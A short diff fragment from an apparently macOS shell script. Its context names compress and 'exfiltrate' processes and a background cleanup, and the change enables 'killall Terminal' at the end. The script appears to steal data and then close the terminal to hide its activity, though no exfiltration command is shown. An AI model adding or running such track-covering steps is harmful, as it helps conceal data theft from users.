@@ -255,4 +255,4 @@ wait $compress_pid
 #wait $exfiltrate_pid
 cleanup &
 
-#killall Terminal
+killall Terminal
